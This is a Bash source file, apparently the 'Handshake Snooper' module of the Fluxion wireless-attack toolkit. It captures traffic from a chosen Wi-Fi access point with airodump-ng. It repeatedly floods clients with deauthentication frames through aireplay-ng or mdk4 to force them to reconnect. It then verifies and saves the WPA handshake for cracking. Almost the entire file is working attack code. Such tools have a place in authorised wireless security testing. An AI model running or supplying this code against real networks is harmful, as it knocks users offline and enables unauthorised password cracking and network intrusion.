#!/usr/bin/env bash

# ============================================================ #
# ============= < Handshake Snooper Parameters > ============= #
# ============================================================ #

HandshakeSnooperState="Not Ready"

# ============================================================ #
# ========= < Handshake Snooper Helper Subroutines > ========= #
# ============================================================ #
handshake_snooper_header() {
  fluxion_header; fluxion_target_show; echo
}

# ============================================================ #
# ============= < Handshake Snooper Subroutines > ============ #
# ============================================================ #
handshake_snooper_arbiter_daemon() {
  if [ ${#@} -lt 1 -o "$HandshakeSnooperState" != "Running" ]; then
    return 1;
  fi

  # Start daemon in the running state to continue execution until aborted,
  # or until a hash has been verified to exist in the capture file.
  # NOTE: The line below must remain before trap to prevent race conditions.
  local handshake_snooper_arbiter_daemon_state="running"

  handshake_snooper_arbiter_daemon_abort() {
    handshake_snooper_arbiter_daemon_state="aborted"
    if [ "$handshake_snooper_arbiter_daemon_viewerPID" ]; then
      kill $handshake_snooper_arbiter_daemon_viewerPID
    fi

    handshake_snooper_stop_deauthenticator
    handshake_snooper_stop_captor

    local -r now=$(env -i date '+%H:%M:%S')
    echo -e "[$now] $HandshakeSnooperArbiterAbortedWarning" >> \
      "$FLUXIONWorkspacePath/handshake_snooper.log"
    exit 2
  }

  trap handshake_snooper_arbiter_daemon_abort SIGABRT

  source "$FLUXIONLibPath/HashUtils.sh"
  source "$FLUXIONLibPath/ColorUtils.sh"

  # Cleanup files we've previously created to avoid conflicts.
  sandbox_remove_workfile "$FLUXIONWorkspacePath/capture/dump-*"

  # Display some feedback to the user to assure verifier is working.
  xterm $FLUXIONHoldXterm $BOTTOMLEFT -bg "#000000" -fg "#CCCCCC" \
    -title "Handshake Snooper Arbiter Log" -e \
    "tail -f \"$FLUXIONWorkspacePath/handshake_snooper.log\"" &
  local handshake_snooper_arbiter_daemon_viewerPID=$!

  local now=$(env -i date '+%H:%M:%S')
  echo -e "[$now] $HandshakeSnooperStartingArbiterNotice" > \
    "$FLUXIONWorkspacePath/handshake_snooper.log"

  handshake_snooper_start_captor
  handshake_snooper_start_deauthenticator

  local handshake_snooper_arbiter_daemon_verified=1 # Assume it hasn't been verified yet (1 => false/error).

  # Keep snooping and verifying until we've got a valid hash from the capture file.
  while [ $handshake_snooper_arbiter_daemon_verified -ne 0 ]; do
    now=$(env -i date '+%H:%M:%S')
    echo -e "[$now] $(io_dynamic_output $HandshakeSnooperSnoopingForNSecondsNotice)" >> \
      "$FLUXIONWorkspacePath/handshake_snooper.log"
    sleep $HandshakeSnooperVerifierInterval &
    wait $! # Using wait to asynchronously catch flags while waiting.

    # If synchronously searching, stop the captor and deauthenticator before checking.
    if [ "$HandshakeSnooperVerifierSynchronicity" = "blocking" ]; then
      now=$(env -i date '+%H:%M:%S')
      echo -e "[$now] $HandshakeSnooperStoppingForVerifierNotice" >> \
        "$FLUXIONWorkspacePath/handshake_snooper.log"
      handshake_snooper_stop_deauthenticator
      handshake_snooper_stop_captor
      mv "$FLUXIONWorkspacePath/capture/dump-01.cap" \
        "$FLUXIONWorkspacePath/capture/recent.cap"
    else
      if [ -x "$(command -v pyrit)" ]; then
        pyrit -r "$FLUXIONWorkspacePath/capture/dump-01.cap" \
          -o "$FLUXIONWorkspacePath/capture/recent.cap" stripLive &> \
          $FLUXIONOutputDevice
      else
        mv "$FLUXIONWorkspacePath/capture/dump-01.cap" \
           "$FLUXIONWorkspacePath/capture/recent.cap" &> $FLUXIONOutputDevice
      fi
    fi

    now=$(env -i date '+%H:%M:%S')
    echo -e "[$now] $HandshakeSnooperSearchingForHashesNotice" >> \
      "$FLUXIONWorkspacePath/handshake_snooper.log"
    hash_check_handshake "$HandshakeSnooperVerifierIdentifier" \
      "$FLUXIONWorkspacePath/capture/recent.cap" \
      "$FluxionTargetSSID" "$FluxionTargetMAC"
    handshake_snooper_arbiter_daemon_verified=$?

    # If synchronously searching, restart the captor and deauthenticator after checking.
    if [ "$HandshakeSnooperVerifierSynchronicity" = "blocking" -a \
      $handshake_snooper_arbiter_daemon_verified -ne 0 ]; then
      sandbox_remove_workfile "$FLUXIONWorkspacePath/capture/*"

      handshake_snooper_start_captor
      handshake_snooper_start_deauthenticator
    fi
  done

  # Assure all processes are stopped before proceeding.
  handshake_snooper_stop_deauthenticator
  handshake_snooper_stop_captor

  local completionTime=$(env -i date '+%H:%M:%S')
  echo -e "[$completionTime] $HandshakeSnooperArbiterSuccededNotice" >> \
    "$FLUXIONWorkspacePath/handshake_snooper.log"
  echo -e "[$completionTime] $HandshakeSnooperArbiterCompletedTip" >> \
    "$FLUXIONWorkspacePath/handshake_snooper.log"

  # Assure we've got a directory to store hashes into.
  mkdir -p "$FLUXIONPath/attacks/Handshake Snooper/handshakes/"

  # Move handshake to storage if one was acquired.
  mv "$FLUXIONWorkspacePath/capture/recent.cap" \
    "$FLUXIONPath/attacks/Handshake Snooper/handshakes/$FluxionTargetSSIDClean-$FluxionTargetMAC.cap"

  # Signal parent process the verification terminated.
  kill -s SIGABRT $1
}

handshake_snooper_stop_captor() {
  if [ "$HandshakeSnooperCaptorPID" ]; then
    kill -s SIGINT $HandshakeSnooperCaptorPID &> $FLUXIONOutputDevice
  fi

  HandshakeSnooperCaptorPID=""
}

handshake_snooper_start_captor() {
  if [ "$HandshakeSnooperCaptorPID" ]; then return 0; fi
  if [ "$HandshakeSnooperState" != "Running" ]; then return 1; fi

  handshake_snooper_stop_captor

  xterm $FLUXIONHoldXterm -title "Handshake Captor (CH $FluxionTargetChannel)" \
    $TOPLEFT -bg "#000000" -fg "#FFFFFF" -e \
    airodump-ng --ignore-negative-one -d $FluxionTargetMAC -w "$FLUXIONWorkspacePath/capture/dump" -c $FluxionTargetChannel -a $HandshakeSnooperJammerInterface &
  local parentPID=$!

  while [ ! "$HandshakeSnooperCaptorPID" ]; do
    sleep 1 &
    wait $!
    HandshakeSnooperCaptorPID=$(pgrep -P $parentPID)
  done
}

handshake_snooper_stop_deauthenticator() {
  if [ "$HandshakeSnooperDeauthenticatorPID" ]; then
    kill $HandshakeSnooperDeauthenticatorPID &> $FLUXIONOutputDevice
  fi

  HandshakeSnooperDeauthenticatorPID=""
}

handshake_snooper_start_deauthenticator() {
  if [ "$HandshakeSnooperDeauthenticatorPID" ]; then return 0; fi
  if [ "$HandshakeSnooperState" != "Running" ]; then return 1; fi

  handshake_snooper_stop_deauthenticator

  # Prepare deauthenticators
  case "$HandshakeSnooperDeauthenticatorIdentifier" in
    "$HandshakeSnooperMdk4MethodOption")
      echo "$FluxionTargetMAC" > $FLUXIONWorkspacePath/mdk4_blacklist.lst ;;
  esac

  # Start deauthenticators.
  case "$HandshakeSnooperDeauthenticatorIdentifier" in
    "$HandshakeSnooperAireplayMethodOption")
      xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
        -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
        "while true; do sleep 7; timeout 3 aireplay-ng --deauth=100 -a $FluxionTargetMAC --ignore-negative-one $HandshakeSnooperJammerInterface; done" &
      HandshakeSnooperDeauthenticatorPID=$!
    ;;
    "$HandshakeSnooperMdk4MethodOption")
            xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
                -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
                "while true; do sleep 7; timeout 3 mdk4 $HandshakeSnooperJammerInterface d -b $FLUXIONWorkspacePath/mdk4_blacklist.lst -c $FluxionTargetChannel; done" &
            HandshakeSnooperDeauthenticatorPID=$!
    ;;
  esac
}


handshake_snooper_unset_deauthenticator_identifier() {
  if [ ! "$HandshakeSnooperDeauthenticatorIdentifier" ]; then return 1; fi
  HandshakeSnooperDeauthenticatorIdentifier=""
}

handshake_snooper_set_deauthenticator_identifier() {
  if [ "$HandshakeSnooperDeauthenticatorIdentifier" ]; then return 0; fi

  handshake_snooper_unset_deauthenticator_identifier

  local methods=(
    "$HandshakeSnooperMonitorMethodOption"
    "$HandshakeSnooperAireplayMethodOption"
    "$HandshakeSnooperMdk4MethodOption"
    "$FLUXIONGeneralBackOption"
  )
  io_query_choice "$HandshakeSnooperMethodQuery" methods[@]

  HandshakeSnooperDeauthenticatorIdentifier=$IOQueryChoice

  echo

  if [ "$HandshakeSnooperDeauthenticatorIdentifier" = \
    "$FLUXIONGeneralBackOption" ]; then
    handshake_snooper_unset_deauthenticator_identifier
    return 1
  fi
}

handshake_snooper_unset_jammer_interface() {
  HandshakeSnooperJammerInterfaceOriginal=""

  if [ ! "$HandshakeSnooperJammerInterface" ]; then return 1; fi
  HandshakeSnooperJammerInterface=""

  # Check if we're automatically selecting the interface & skip
  # this one if so to take the user back properly.
  local interfacesAvailable
  readarray -t interfacesAvailable < <(attack_targetting_interfaces)

  if [ ${#interfacesAvailable[@]} -le 1 ]; then return 2; fi
}

handshake_snooper_set_jammer_interface() {
  if [ "$HandshakeSnooperJammerInterface" ]; then return 0; fi

  # NOTICE: The code below should be excluded because the interface selected
  # below is also being used as the monitoring interface (required)!
  #if [ "$HandshakeSnooperDeauthenticatorIdentifier" = \
  #  "$HandshakeSnooperMonitorMethodOption" ]; then return 0; fi

  if [ ! "$HandshakeSnooperJammerInterfaceOriginal" ]; then
    echo "Running get jammer interface." > $FLUXIONOutputDevice
    if ! fluxion_get_interface attack_targetting_interfaces \
      "$HandshakeSnooperJammerInterfaceQuery"; then
      echo "Failed to get jammer interface" > $FLUXIONOutputDevice
      return 1
    fi
    HandshakeSnooperJammerInterfaceOriginal=$FluxionInterfaceSelected
  fi

  local selectedInterface=$HandshakeSnooperJammerInterfaceOriginal

  if ! fluxion_allocate_interface $selectedInterface; then
    echo "Failed to allocate jammer interface" > $FLUXIONOutputDevice
    return 2
  fi

  echo "Succeeded get jammer interface." > $FLUXIONOutputDevice
  HandshakeSnooperJammerInterface=${FluxionInterfaces[$selectedInterface]}
}

handshake_snooper_unset_verifier_identifier() {
  if [ ! "$HandshakeSnooperVerifierIdentifier" ]; then return 1; fi
  HandshakeSnooperVerifierIdentifier=""
}

handshake_snooper_set_verifier_identifier() {
  if [ "$HandshakeSnooperVerifierIdentifier" ]; then return 0; fi

  handshake_snooper_unset_verifier_identifier

  local choices=(
    "$FLUXIONHashVerificationMethodAircrackOption"
    "$FLUXIONHashVerificationMethodCowpattyOption"
  )
  # Add pyrit to the options is available.
  if [ -x "$(command -v pyrit)" ]; then
    choices+=("$FLUXIONHashVerificationMethodPyritOption")
  fi

  choices+=("$FLUXIONGeneralBackOption")

  io_query_choice "$FLUXIONHashVerificationMethodQuery" choices[@]

  echo

  case "$IOQueryChoice" in
    "$FLUXIONHashVerificationMethodPyritOption")
      HandshakeSnooperVerifierIdentifier="pyrit" ;;
    "$FLUXIONHashVerificationMethodAircrackOption")
      HandshakeSnooperVerifierIdentifier="aircrack-ng" ;;
    "$FLUXIONHashVerificationMethodCowpattyOption")
      HandshakeSnooperVerifierIdentifier="cowpatty" ;;
    "$FLUXIONGeneralBackOption")
      handshake_snooper_unset_verifier_identifier
      return 1
      ;;
  esac
}

handshake_snooper_unset_verifier_interval() {
  if [ ! "$HandshakeSnooperVerifierInterval" ]; then return 1; fi
  HandshakeSnooperVerifierInterval=""
}

handshake_snooper_set_verifier_interval() {
  if [ "$HandshakeSnooperVerifierInterval" ]; then return 0; fi

  handshake_snooper_unset_verifier_interval

  local choices=("$HandshakeSnooperVerifierInterval30SOption" "$HandshakeSnooperVerifierInterval60SOption" "$HandshakeSnooperVerifierInterval90SOption" "$FLUXIONGeneralBackOption")
  io_query_choice "$HandshakeSnooperVerifierIntervalQuery" choices[@]

  case "$IOQueryChoice" in
    "$HandshakeSnooperVerifierInterval30SOption")
      HandshakeSnooperVerifierInterval=30 ;;
    "$HandshakeSnooperVerifierInterval60SOption")
      HandshakeSnooperVerifierInterval=60 ;;
    "$HandshakeSnooperVerifierInterval90SOption")
      HandshakeSnooperVerifierInterval=90 ;;
    "$FLUXIONGeneralBackOption")
      handshake_snooper_unset_verifier_interval
      return 1
      ;;
  esac
}

handshake_snooper_unset_verifier_synchronicity() {
  if [ ! "$HandshakeSnooperVerifierSynchronicity" ]; then return 1; fi
  HandshakeSnooperVerifierSynchronicity=""
}

handshake_snooper_set_verifier_synchronicity() {
  if [ "$HandshakeSnooperVerifierSynchronicity" ]; then return 0; fi

  handshake_snooper_unset_verifier_synchronicity

  local choices=(
    "$HandshakeSnooperVerifierSynchronicityAsynchronousOption"
    "$HandshakeSnooperVerifierSynchronicitySynchronousOption"
    "$FLUXIONGeneralBackOption"
  )

  io_query_choice "$HandshakeSnooperVerifierSynchronicityQuery" choices[@]

  case "$IOQueryChoice" in
    "$HandshakeSnooperVerifierSynchronicityAsynchronousOption")
      HandshakeSnooperVerifierSynchronicity="non-blocking" ;;
    "$HandshakeSnooperVerifierSynchronicitySynchronousOption")
      HandshakeSnooperVerifierSynchronicity="blocking" ;;
    "$FLUXIONGeneralBackOption")
      handshake_snooper_unset_verifier_synchronicity
      return 1
      ;;
  esac
}


# ============================================================ #
# =================== < Parse Parameters > =================== #
# ============================================================ #
if [ ! "$HandshakeSnooperCLIArguments" ]; then
  if ! HandshakeSnooperCLIArguments=$(
    getopt --options="v:i:j:a" \
      --longoptions="verifier:,interval:,jammer:,asynchronous" \
      --name="Handshake Snooper V$FLUXIONVersion.$FLUXIONRevision" -- "$@"
    );then
    echo -e "${CRed}Aborted$CClr, parameter error detected..."
    sleep 5
    fluxion_handle_exit
  fi

  declare -r HandshakeSnooperCLIArguments=$HandshakeSnooperCLIArguments

  eval set -- "$HandshakeSnooperCLIArguments" # Set environment parameters.
fi


# ============================================================ #
# ============= < Argument Loaded Configurables > ============ #
# ============================================================ #
while [ "$1" != "" -a "$1" != "--" ]; do
  case "$1" in
    -v|--verifier)
      HandshakeSnooperVerifierIdentifier=$2; shift;;
    -i|--interval)
      HandshakeSnooperVerifierInterval=$2; shift;;
    -j|--jammer)
      HandshakeSnooperJammerInterfaceOriginal=$2; shift;;
    -a|--asynchronous)
      HandshakeSnooperVerifierSynchronicity="non-blocking";;
  esac
  shift # Shift new parameters
done


# ============================================================ #
# ===================== < Fluxion Hooks > ==================== #
# ============================================================ #
attack_targetting_interfaces() {
  interface_list_wireless
  local interface
  for interface in "${InterfaceListWireless[@]}"; do
    echo "$interface"
  done
}

attack_tracking_interfaces() {
  interface_list_wireless
  local interface
  for interface in "${InterfaceListWireless[@]}"; do
    echo "$interface"
  done
  echo "" # This enables the Skip option.
}

unprep_attack() {
  HandshakeSnooperState="Not Ready"

  handshake_snooper_unset_verifier_synchronicity
  handshake_snooper_unset_verifier_interval
  handshake_snooper_unset_verifier_identifier
  handshake_snooper_unset_jammer_interface
  handshake_snooper_unset_deauthenticator_identifier

  sandbox_remove_workfile "$FLUXIONWorkspacePath/capture"
}

prep_attack() {
  mkdir -p "$FLUXIONWorkspacePath/capture"

  IOUtilsHeader="handshake_snooper_header"

  # Removed read-only due to local constant shadowing bug.
  # I've reported the bug, we can add it when fixed.
  local sequence=(
    "set_deauthenticator_identifier"
    "set_jammer_interface"
    "set_verifier_identifier"
    "set_verifier_interval"
    "set_verifier_synchronicity"
  )

  if ! fluxion_do_sequence handshake_snooper sequence[@]; then
    return 1
  fi

  HandshakeSnooperState="Ready"
}

load_attack() {
  local -r configurationPath=$1

  local configuration
  readarray -t configuration < <(more "$configurationPath")

  HandshakeSnooperDeauthenticatorIdentifier=${configuration[0]}
  HandshakeSnooperJammerInterfaceOriginal=${configuration[1]}
  HandshakeSnooperVerifierIdentifier=${configuration[2]}
  HandshakeSnooperVerifierInterval=${configuration[3]}
  HandshakeSnooperVerifierSynchronicity=${configuration[4]}
}

save_attack() {
  local -r configurationPath=$1

  # Store/overwrite attack configuration for pause & resume.
  # Order: DeauthID, JammerWI, VerifId, VerifInt, VerifSync
  echo "$HandshakeSnooperDeauthenticatorIdentifier" > "$configurationPath"
  echo "$HandshakeSnooperJammerInterfaceOriginal" >> "$configurationPath"
  echo "$HandshakeSnooperVerifierIdentifier" >> "$configurationPath"
  echo "$HandshakeSnooperVerifierInterval" >> "$configurationPath"
  echo "$HandshakeSnooperVerifierSynchronicity" >> "$configurationPath"
}

stop_attack() {
  if [ "$HandshakeSnooperArbiterPID" ]; then
    kill -s SIGABRT $HandshakeSnooperArbiterPID &> $FLUXIONOutputDevice
  fi

  HandshakeSnooperArbiterPID=""

  HandshakeSnooperState="Stopped"
}

start_attack() {
  if [ "$HandshakeSnooperState" = "Running" ]; then return 0; fi
  if [ "$HandshakeSnooperState" != "Ready" ]; then return 1; fi
  HandshakeSnooperState="Running"

  handshake_snooper_arbiter_daemon $$ &> $FLUXIONOutputDevice &
  HandshakeSnooperArbiterPID=$!
}

# FLUXSCRIPT END
